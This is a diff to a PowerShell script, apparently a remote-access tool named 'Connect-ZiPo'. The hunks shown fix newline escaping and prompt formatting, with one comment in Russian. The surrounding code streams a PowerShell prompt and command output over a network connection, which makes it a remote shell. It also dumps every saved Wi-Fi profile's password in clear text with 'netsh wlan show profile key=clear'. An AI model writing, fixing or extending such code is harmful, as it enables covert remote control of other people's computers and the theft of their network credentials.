@@ -61,8 +61,8 @@ function Connect-ZiPo {
 
         $results = ""
         foreach ($profile in $profiles) {
-            $results += "[$profile]n"
-            $results += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") + "n"
+            $results += "[$profile]`n"
+            $results += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") + "`n"
         }
         return $results
     }
@@ -109,7 +109,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 ------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + " `nPS $currentDir> "
+            $intro = $clear + $banner + "`nPS $currentDir> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -178,10 +178,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                # Универсальное добавление приглашения:
-                if (-not $response.EndsWith("nPS $currentDir> ")) {
-                    $response += "nPS $currentDir> "
-                }
+                # Обновлённое добавление приглашения:
+                $response = ($response.TrimEnd() + "`n`nPS $currentDir> ")
 
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
